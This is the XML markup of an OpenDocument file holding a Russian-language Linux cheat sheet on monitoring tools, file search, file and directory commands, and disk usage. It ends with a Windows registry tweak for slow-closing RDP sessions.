      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">umount</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">2 - Размонтировать диск </text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">2, предварительно неоходимо выйти из точки монтирования /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">2</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Мониторинг в ОС Linux \ ps \ top \ gstat \ vmstat \ iostat \ netstat </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">apt-get install top</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">apt-get install ganglia-monitor</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">apt-get install sysstat</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">apt-get install sockstat</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">У утилиты </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3"> есть параметры, которые облегают жизнь, их мы набираем в </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3">’</text:span><text:span text:style-name="T2">e</text:span><text:span text:style-name="T3"> когда он запущен:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">S</text:span><text:span text:style-name="T3"> - показать системные процессы, по умолчанию они не показываются</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">u</text:span><text:span text:style-name="T3"> - и имя пользователя, например </text:span><text:span text:style-name="T2">u</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">mysql</text:span><text:span text:style-name="T3"> покажет процессы запущенные от пользователя </text:span><text:span text:style-name="T2">mysql</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">o</text:span><text:span text:style-name="T3"> - используем для сортировки, возможные параметры - </text:span><text:span text:style-name="T2">pri</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">size</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">res</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">cpu</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">time</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">threads</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">m</text:span><text:span text:style-name="T3"> - переключение между режимами отображения нагрузки и ввода-вывода</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">k</text:span><text:span text:style-name="T3"> - завершить процесс, ввод </text:span><text:span text:style-name="T2">pid</text:span><text:span text:style-name="T3"> процесса</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> - изменить приоритет процесса, вводим </text:span><text:span text:style-name="T2">pid</text:span><text:span text:style-name="T3"> процесса</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> - отображать статистику по определённому процесс</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> - показывает абсолютные запущенных процессов</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> 3 - показывает самые ресурсоёмкие приложения в данный момент</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">gstat</text:span><text:span text:style-name="T3"> - показывает использование дисков.</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">gstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> - используется для вывода только активных устройств</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">vmstat</text:span><text:span text:style-name="T3"> - показывает состояние виртуальной памяти и буфера</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">vmstat</text:span><text:span text:style-name="T3"> 5 - отображает статистику раз в пять секунд</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">vmstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">z</text:span><text:span text:style-name="T3"> - показывает состояние буфера</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">vmstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">i</text:span><text:span text:style-name="T3"> - показывает состояние прерываний</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">iostat</text:span><text:span text:style-name="T3"> - выводит статистику по </text:span><text:span text:style-name="T2">I</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">O</text:span><text:span text:style-name="T3"> устройств</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">iostat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">w</text:span><text:span text:style-name="T3">5 - показывать информацию по дискам, с периодичностью в пять секунд безостановочно</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">iostat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">dx</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">w</text:span><text:span text:style-name="T3">5 - показывает расширенную статистику</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">iostat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">dx</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">vda</text:span><text:span text:style-name="T3"> 5 - показывает расширенную статистику</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3"> - показывает активные сетевые соединения.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">w</text:span><text:span text:style-name="T3"> 1 - количество пакетов в настоящее время.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">ibt</text:span><text:span text:style-name="T3"> - вывод сетевых интерфейсов с разбивкой по </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3"> адресам, отображает объём трафика, количество ошибок, коллизий</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">rn</text:span><text:span text:style-name="T3"> - отображает таблицу маршрутизации</text:span></text:p>
      <text:p text:style-name="P1">Поиск нужного файла</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> / -</text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> - Найти все директории и файлы, принадлежащие пользователю </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3">. Поиск будет производиться, начиная с корневой директории (/)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> / -</text:span><text:span text:style-name="T2">name</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">filedir</text:span><text:span text:style-name="T3"> - Найти директории и файлы с именем </text:span><text:span text:style-name="T2">filedir</text:span><text:span text:style-name="T3">. Поиск будет производиться, начиная с корневой директории (/)</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atime</text:span><text:span text:style-name="T3"> +20 - Найти все файлы в директории /</text:span><text:span text:style-name="T2">usr</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bin</text:span><text:span text:style-name="T3">, время последнего обращения к которым более 20 дней</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mtime</text:span><text:span text:style-name="T3"> -10 - Найти все файлы в директории /</text:span><text:span text:style-name="T2">usr</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bin</text:span><text:span text:style-name="T3">, которые были созданы или модифицированы в течении последних 10 дней</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> / -</text:span><text:span text:style-name="T2">xdev</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">name</text:span><text:span text:style-name="T3"> \*.</text:span><text:span text:style-name="T2">rpm</text:span><text:span text:style-name="T3"> - Искать директории и файлы, имена которых оканчиваются на ".</text:span><text:span text:style-name="T2">rpm</text:span><text:span text:style-name="T3">", но игнорируя съёмные накопители, </text:span><text:span text:style-name="T2">cdrom</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">usb</text:span><text:span text:style-name="T3"> и т. п.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> . -</text:span><text:span text:style-name="T2">maxdepth</text:span><text:span text:style-name="T3"> 1 -</text:span><text:span text:style-name="T2">name</text:span><text:span text:style-name="T3"> *.</text:span><text:span text:style-name="T2">jpg</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">print</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">exec</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">convert</text:span><text:span text:style-name="T3"> - Найти в текущей директории все файлы с расширением </text:span><text:span text:style-name="T2">jpg</text:span><text:span text:style-name="T3"> и выполнить для каждого команду </text:span><text:span text:style-name="T2">convert</text:span><text:span text:style-name="T3"> ( </text:span><text:span text:style-name="T2">Imagemagick</text:span><text:span text:style-name="T3"> )</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">path</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">to</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">name</text:span><text:span text:style-name="T3"> \*.</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3"> - Найти все директории и файлы, имена которых оканчиваются на ".с". Поиск будет производиться, начиная с директории /</text:span><text:span text:style-name="T2">path</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">to</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">dir</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> / -</text:span><text:span text:style-name="T2">name</text:span><text:span text:style-name="T3"> *.</text:span><text:span text:style-name="T2">rpm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">exec</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">chmod</text:span><text:span text:style-name="T3"> 755 '{}' \; - Начиная с корня, найти все фалы и директории, имена которых оканчиваются на ".</text:span><text:span text:style-name="T2">rpm</text:span><text:span text:style-name="T3">", и для каждого изменить права доступа</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">whereis</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> - Вывод полных путей к бинарным файлам, файлом исходных кодов и руководств, имеющих отношение к файлу </text:span><text:span text:style-name="T2">ls</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">locate</text:span><text:span text:style-name="T3"> \*.</text:span><text:span text:style-name="T2">ps</text:span><text:span text:style-name="T3"> - Поиск всех файлов, содержащих в имени ".</text:span><text:span text:style-name="T2">ps</text:span><text:span text:style-name="T3">" по специальной базе данных, предварительно сформированной командой </text:span><text:span text:style-name="T2">updatedb</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">which</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> - Вывести полный путь до файла </text:span><text:span text:style-name="T2">ls</text:span></text:p>
      <text:p text:style-name="P1">Работа с файлами и папками</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">pwd</text:span><text:span text:style-name="T3"> - Вывести текущую директорию</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3"> - Перейти в директорию /</text:span><text:span text:style-name="T2">home</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> .. - Перейти в родительский каталог, то есть подняться на уровень выше</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> ../.. - Подняться в дереве каталогов на два уровня</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> - Перейти в домашний каталог</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> ~</text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3"> - Перейти в домашний каталог пользователя </text:span><text:span text:style-name="T2">user</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> - - Перейти в предыдущую директорию, из которой был сделан переход в текущую директорию</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cp</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">_1 </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">_2 - Копировать директорию </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">_1 в директорию </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">_2</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cp</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">_1 </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">_2 - Копировать файл </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">_1 в файл </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">_2</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cp</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">tmp</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3"> . - копировать директорию </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3"> и все ее содержимое в текущую директорию</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cp</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">/* . - Копировать все файлы, содержащиеся в директории </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3"> в текущую директорию</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">iconv</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> - Выводит список доступных для использования кодировок</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">iconv</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">windows</text:span><text:span text:style-name="T3">-1251 -</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">utf</text:span><text:span text:style-name="T3">-8 </text:span><text:span text:style-name="T2">inputFile</text:span><text:span text:style-name="T3"> &gt; </text:span><text:span text:style-name="T2">outputFile</text:span><text:span text:style-name="T3"> - Конвертировать файл из кодировки </text:span><text:span text:style-name="T2">windows</text:span><text:span text:style-name="T3">-1251 в кодировку </text:span><text:span text:style-name="T2">utf</text:span><text:span text:style-name="T3">-8</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ln</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">s</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символическую ссылку </text:span><text:span text:style-name="T2">link</text:span><text:span text:style-name="T3"> на директорию или файл </text:span><text:span text:style-name="T2">filedir</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ln</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жесткую ссылку </text:span><text:span text:style-name="T2">link</text:span><text:span text:style-name="T3"> на директорию или файл </text:span><text:span text:style-name="T2">filedir</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> - Вывести листинг содержимого текущей директории</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">F</text:span><text:span text:style-name="T3"> - Листинг текущей директории с добавлением к именам символов, обозначающих тип объекта</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> - Листинг текущей директории с подробностями по каждому объекту ( права доступа, владелец, группа, дата, размер )</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> - Кроме обычных объектов, вывести в листинге, скрытые файлы и директории, текущего каталога</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">tmp</text:span><text:span text:style-name="T3"> | </text:span><text:span text:style-name="T2">pr</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">T</text:span><text:span text:style-name="T3">5 -</text:span><text:span text:style-name="T2">W</text:span><text:span text:style-name="T3">$</text:span><text:span text:style-name="T2">COLUMNS</text:span><text:span text:style-name="T3"> - Листинг директории /</text:span><text:span text:style-name="T2">tmp</text:span><text:span text:style-name="T3"> в 5 колонок</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> *[0-9]* - Вывести в листинг файлов и директорий текущего каталога, содержащие в имени цифровые символы</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">lstree</text:span><text:span text:style-name="T3"> - Листинг иерархии директорий и файлов, начиная с корневого каталога (/)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mkdir</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3"> - Создать в текущем каталоге, директорию с именем </text:span><text:span text:style-name="T2">dir</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mkdir</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">_1 </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">_2 - Создать в текущем каталоге две директории, с именами </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">_1 и </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">_2</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mkdir</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">p</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">path</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">to</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3"> - Создать иерархию директорий. Кроме самой директории </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3"> будут созданы все промежуточные директории</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mv</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">filedir</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">new</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">filedir</text:span><text:span text:style-name="T3"> - Переместить ( переименовать ) файл или директорию из </text:span><text:span text:style-name="T2">filedir</text:span><text:span text:style-name="T3"> в </text:span><text:span text:style-name="T2">new</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">filedir</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">rm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">rf</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3"> - Рекурсивно удалить директорию </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3"> и всё её содержимое, без запроса подтверждения на удаление</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">rm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Удалить файл </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">, без запроса подтверждения</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">rm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">rf</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">_1 /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">_2 - Удалить директории /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">_1 и /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">_2 вместе с содержимым, без запроса подтверждения</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">rmdir</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3"> - Удалить директорию /</text:span><text:span text:style-name="T2">dir</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">tree</text:span><text:span text:style-name="T3"> - Вывести иерархию директорий и файлов, начиная с корневой (/)</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">touch</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3"> 0712250000 </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 - Изменить дату и время создания файла, если указанный файл не существует, создать его с указанными датой и временем (</text:span><text:span text:style-name="T2">YYMMDDhhmm</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P1">Дисковое пространство</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">df</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">h</text:span><text:span text:style-name="T3"> - Вывод информации о свободном и занятом дисковом пространстве на смонтированных разделах, в формате, удобном для чтения</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">dpkg</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">query</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">W</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3">='${</text:span><text:span text:style-name="T2">Installed</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">Size</text:span><text:span text:style-name="T3">;10}</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3">${</text:span><text:span text:style-name="T2">Packag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используемого дискового пространства, занятого файлами </text:span><text:span text:style-name="T2">deb</text:span><text:span text:style-name="T3">-пакета, с сортировкой по размеру (</text:span><text:span text:style-name="T2">ubuntu</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">debian</text:span><text:span text:style-name="T3"> т.п.)</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">du</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">sh</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3"> - Выводит объем дискового пространства, занимаемый директорией </text:span><text:span text:style-name="T2">dir</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">du</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">sk</text:span><text:span text:style-name="T3"> * | </text:span><text:span text:style-name="T2">sort</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">rn</text:span><text:span text:style-name="T3"> - Выводит листинг файлов и директорий с размером, сортируя его по размеру</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">lSr</text:span><text:span text:style-name="T3"> | </text:span><text:span text:style-name="T2">more</text:span><text:span text:style-name="T3"> - Выводит листинг файлов и директорий, сортируя по возрастанию размера и перенаправляет его в программу </text:span><text:span text:style-name="T2">more</text:span><text:span text:style-name="T3"> для постраничного просмотра</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">rpm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">q</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> --</text:span><text:span text:style-name="T2">qf</text:span><text:span text:style-name="T3"> '%10{</text:span><text:span text:style-name="T2">SIZE</text:span><text:span text:style-name="T3">}</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3">%{</text:span><text:span text:style-name="T2">NAM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дискового пространства, занимаемого файлами </text:span><text:span text:style-name="T2">rpm</text:span><text:span text:style-name="T3">-пакета, с сортировкой по размеру ( </text:span><text:span text:style-name="T2">fedora</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">redhat</text:span><text:span text:style-name="T3"> и т.п.)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Долгое завершение </text:span><text:span text:style-name="T2">rdp</text:span><text:span text:style-name="T3"> сессии</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Очень часто, долго завершается терминальная сессия. Виноват какой то процесс, долго выполняющий свое закрытие. Чаще всего это - </text:span><text:span text:style-name="T2">SplWOW</text:span><text:span text:style-name="T3">64.</text:span><text:span text:style-name="T2">exe</text:span></text:p>
      <text:p text:style-name="P1">Для его принудительного, быстрого завершения, необходимо добавить ветку реестра</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\SysProcs"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">DWORD</text:span><text:span text:style-name="T3">: </text:span><text:span text:style-name="T2">SPLWOW</text:span><text:span text:style-name="T3">64.</text:span><text:span text:style-name="T2">EXE</text:span><text:span text:style-name="T3"> = 0</text:span></text:p>
      <text:p text:style-name="P7">Таким же способом добавляется любая программа, которая долго выполняет закрытие.</text:p>
      <text:p text:style-name="P1">Просмотр содержимого файлов</text:p>
